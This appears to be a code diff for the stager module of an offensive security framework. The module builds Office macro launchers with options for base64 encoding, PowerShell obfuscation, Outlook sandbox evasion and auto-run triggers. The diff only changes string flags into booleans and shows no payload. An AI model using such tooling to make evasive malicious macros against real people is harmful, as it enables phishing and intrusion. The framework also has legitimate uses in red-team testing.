@@ -48,16 +48,12 @@ class Stager:
             "Base64": {
                 "Description": "Base64 encode the output.",
                 "Required": True,
-                "Value": "True",
-                "SuggestedValues": ["True", "False"],
-                "Strict": True,
+                "Value": True,
             },
             "Obfuscate": {
                 "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types.",
                 "Required": False,
-                "Value": "False",
-                "SuggestedValues": ["True", "False"],
-                "Strict": True,
+                "Value": False,
                 "DependsOn": [{"name": "Language", "values": ["powershell"]}],
             },
             "ObfuscateCommand": {
@@ -93,9 +89,7 @@ class Stager:
             "OutlookEvasion": {
                 "Description": "Include BC-Security's Outlook Sandbox evasion code",
                 "Required": False,
-                "Value": "False",
-                "SuggestedValues": ["True", "False"],
-                "Strict": True,
+                "Value": False,
             },
             "Trigger": {
                 "Description": "Trigger for the macro (autoopen, autoclose).",
@@ -140,17 +134,9 @@ class Stager:
         else:
             macro_sub_name = "AutoClose()"
 
-        encode = False
-        if base64.lower() == "true":
-            encode = True
-
-        invoke_obfuscation = False
-        if obfuscate.lower() == "true":
-            invoke_obfuscation = True
-
-        outlook_evasion_bool = False
-        if outlook_evasion.lower() == "true":
-            outlook_evasion_bool = True
+        encode = base64
+        invoke_obfuscation = obfuscate
+        outlook_evasion_bool = outlook_evasion
 
         if language in ["csharp", "ironpython"]:
             launcher = self.mainMenu.stagergenv2.generate_exe_oneliner_routed(
